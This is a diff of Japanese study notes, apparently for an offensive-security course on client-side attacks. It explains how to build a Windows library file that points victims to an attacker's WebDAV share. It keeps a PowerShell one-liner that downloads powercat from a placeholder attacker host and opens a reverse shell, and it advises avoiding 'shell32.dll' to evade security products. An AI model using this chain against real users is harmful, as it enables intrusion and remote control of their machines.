@@ -481,87 +481,6 @@ $$ライブラリファイルをダブルクリックした画面$$
 
 $$実行後のライブラリファイルの中身が変わっている$$
 
-#### 補足：XMLコードの解説
-
-1. XMLの名前空間を明示する
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
-...
-</libraryDescription>
-```
-- xmlns（xml name space)：XMLにおける名前空間（[📕](../../BSCP/Misc/📕.md#名前空間)）
-- `http://schemas.microsoft.com/windows/2009/librarye`：Microsoftのライブラリスキーマに属することを明示する
-- [用語](../Misc/用語.md#xmlnsにおけるリンク)
-
-2. 「ドキュメント」のローカライズリソース（文字列・UI要素）などを参照する
-```xml
-<name>@windows.storage.dll,-34582</name>
-<version>6</version>
-```
-- `<name>`：DLLライブラリの名前を指定
-	- 他にも`shell32.dll`が使えるが、"shell"というワードがセキュリティ製品に検知されるかもしれないので使用を避ける
-- `-34582`：ドキュメントのリソースID（ピクチャは`-34595`)
-	- ※リソースIDは[Resource Hacker](https://forest.watch.impress.co.jp/article/2001/01/29/okiniiri.html)などのツールを使う方法があるが、生成AIに聞く方が楽
-- [Module 12：Client-side Attacks](#補足：リソースID(`@windows.storage.dll,-34582`)について)
-- `<version>`：任意の数値
-- [用語](../Misc/用語.md#DLL(Dynamic%20link%20library))
-
-3. ライブラリファイルの見た目を整備する
-```xml
-<isLibraryPinned>true</isLibraryPinned>
-<iconReference>imageres.dll,-1002</iconReference>
-```
-- `<isLibraryPinned>`：Windowsエクスプローラーのナビゲーターパネルに表示されるようにする（以下画像赤枠部分）
-- `<iconReference>`：ライブラリファイルのアイコンをリソースのみDLLから選択する
-	- `imageres.dll`：リソースが格納されたシステム用DLL
-		- パス：C:\Windows\System32\imageres.dll
-	- 1002：ドキュメントのアイコンを指すリソースID（1003：ピクチャのアイコン）
-
- ![](../画像ファイル/Pasted%20image%2020250518151605.png)
-
-4. ライブラリファイルがWindowsエクスプローラー上で開かれたときにどのようなカラム構成（以下画像赤枠）になるかを指定する
-```xml
-<templateInfo>
-<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
-</templateInfo>
-```
-- [Microsoft documentation](https://learn.microsoft.com/ja-jp/windows/win32/shell/schema-library-foldertype)の「フォルダーの種類」に記載されているGUIDを`<folderType>`に指定する（今回はアイコンをドキュメントにしているのでドキュメントのGUIDを指定）
-	- 例えばフォルダタイプがミュージックだと、アーティスト名やトラック番号のカラムとなってしまう
-
-![](../画像ファイル/Pasted%20image%2020250518152940.png)
-
-5. ライブラリファイルが指すストレージの場所を指定する
-```xml
-<searchConnectorDescriptionList>
-<searchConnectorDescription>
-<isDefaultSaveLocation>true</isDefaultSaveLocation>
-<isSupported>false</isSupported>
-<simpleLocation>
-<url>http://[AttackerIP]</url>
-</simpleLocation>
-</searchConnectorDescription>
-</searchConnectorDescriptionList>
-```
-- `<isDefaultSaveLocation>`：ユーザーがファイルを保存したときのwindowsエクスプローラーの挙動・保存場所を指定（true＝デフォルト）
-- `<isSupported>`：互換性のために存在するが不要なのでfalse
-- `<simpleLocation>`：リモートの場所を指定（WebDav共有）
-
-##### 補足：リソースID(`@windows.storage.dll,-34582`)について
-
-- `@windows.storage.dll,-34582` は、`windows.storage.dll` の中にあるリソースID 34582 を参照する
-
-- Windowsエクスプローラーでライブラリ（たとえば「ドキュメント」や「ピクチャ」など）を表示するとき、見た目の名称が必要になる
-- その表示名をハードコードされた文字列ではなく、DLLの中にあるローカライズ済み（多言語対応された）リソースから取得する形式がこの記述
-
-- 何のためにあるのか？　→　 ライブラリの名前（表示名）を指定するためにある
-- 34582じゃなくて適当な値でもいいのか？　→　ダメ
-- なぜローカライズDLLを使うのか？↓
-
-| 方法                                                      | 影響                                                           |
-| ------------------------------------------------------- | ------------------------------------------------------------ |
-| `<name>Documents</name>` のように直接書く                       | ・OSの言語が英語以外（日本語など）の場合に対応できない  <br>・翻訳作業が必要になる  <br>・一貫性がなくなる |
-| `<name>@windows.storage.dll,-34582</name>` のようにDLLを参照する | ✅ OSが自動で言語に合わせて表示  <br>✅ Windows標準ライブラリと同じ形式で自然に見える          |
 
 ### 第3段階：.lnkファイルの準備
 
@@ -573,7 +492,7 @@ $$実行後のライブラリファイルの中身が変わっている$$
 ```powershell
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[AttackerIP]:[Port]/powercat.ps1');powercat -c [AttackerIP] -p [ListenerPort] -e powershell"
 ```
-- 参考：[忘れがちなコマンド(Linux・Windows)](../Cheatsheet/Common/忘れがちなコマンド(Linux・Windows).md#PowerShellワンライナーのBase64エンコード化)
+
 
 ![](../画像ファイル/Pasted%20image%2020250519074203.png)
 
@@ -648,6 +567,88 @@ $$.lnk実行時の警告ポップアップ$$
 ---
 
 # 補足事項
+
+## XMLコードの解説
+
+1. XMLの名前空間を明示する
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+...
+</libraryDescription>
+```
+- xmlns（xml name space)：XMLにおける名前空間（[📕](../../BSCP/Misc/📕.md#名前空間)）
+- `http://schemas.microsoft.com/windows/2009/librarye`：Microsoftのライブラリスキーマに属することを明示する
+- [用語](../Misc/用語.md#xmlnsにおけるリンク)
+
+2. 「ドキュメント」のローカライズリソース（文字列・UI要素）などを参照する
+```xml
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+```
+- `<name>`：DLLライブラリの名前を指定
+	- 他にも`shell32.dll`が使えるが、"shell"というワードがセキュリティ製品に検知されるかもしれないので使用を避ける
+- `-34582`：ドキュメントのリソースID（ピクチャは`-34595`)
+	- ※リソースIDは[Resource Hacker](https://forest.watch.impress.co.jp/article/2001/01/29/okiniiri.html)などのツールを使う方法があるが、生成AIに聞く方が楽
+- [Module 12：Client-side Attacks](#補足：リソースID(`@windows.storage.dll,-34582`)について)
+- `<version>`：任意の数値
+- [用語](../Misc/用語.md#DLL(Dynamic%20link%20library))
+
+3. ライブラリファイルの見た目を整備する
+```xml
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1002</iconReference>
+```
+- `<isLibraryPinned>`：Windowsエクスプローラーのナビゲーターパネルに表示されるようにする（以下画像赤枠部分）
+- `<iconReference>`：ライブラリファイルのアイコンをリソースのみDLLから選択する
+	- `imageres.dll`：リソースが格納されたシステム用DLL
+		- パス：C:\Windows\System32\imageres.dll
+	- 1002：ドキュメントのアイコンを指すリソースID（1003：ピクチャのアイコン）
+
+ ![](../画像ファイル/Pasted%20image%2020250518151605.png)
+
+4. ライブラリファイルがWindowsエクスプローラー上で開かれたときにどのようなカラム構成（以下画像赤枠）になるかを指定する
+```xml
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+```
+- [Microsoft documentation](https://learn.microsoft.com/ja-jp/windows/win32/shell/schema-library-foldertype)の「フォルダーの種類」に記載されているGUIDを`<folderType>`に指定する（今回はアイコンをドキュメントにしているのでドキュメントのGUIDを指定）
+	- 例えばフォルダタイプがミュージックだと、アーティスト名やトラック番号のカラムとなってしまう
+
+![](../画像ファイル/Pasted%20image%2020250518152940.png)
+
+5. ライブラリファイルが指すストレージの場所を指定する
+```xml
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://[AttackerIP]</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+```
+- `<isDefaultSaveLocation>`：ユーザーがファイルを保存したときのwindowsエクスプローラーの挙動・保存場所を指定（true＝デフォルト）
+- `<isSupported>`：互換性のために存在するが不要なのでfalse
+- `<simpleLocation>`：リモートの場所を指定（WebDav共有）
+
+## リソースID(`@windows.storage.dll,-34582`)について
+
+- `@windows.storage.dll,-34582` は、`windows.storage.dll` の中にあるリソースID 34582 を参照する
+
+- Windowsエクスプローラーでライブラリ（たとえば「ドキュメント」や「ピクチャ」など）を表示するとき、見た目の名称が必要になる
+- その表示名をハードコードされた文字列ではなく、DLLの中にあるローカライズ済み（多言語対応された）リソースから取得する形式がこの記述
+
+- 何のためにあるのか？　→　 ライブラリの名前（表示名）を指定するためにある
+- 34582じゃなくて適当な値でもいいのか？　→　ダメ
+- なぜローカライズDLLを使うのか？↓
+
+| 方法                                                      | 影響                                                           |
+| ------------------------------------------------------- | ------------------------------------------------------------ |
+| `<name>Documents</name>` のように直接書く                       | ・OSの言語が英語以外（日本語など）の場合に対応できない  <br>・翻訳作業が必要になる  <br>・一貫性がなくなる |
+| `<name>@windows.storage.dll,-34582</name>` のようにDLLを参照する | ✅ OSが自動で言語に合わせて表示  <br>✅ Windows標準ライブラリと同じ形式で自然に見える          |
 
 ## HTAペイロード
 
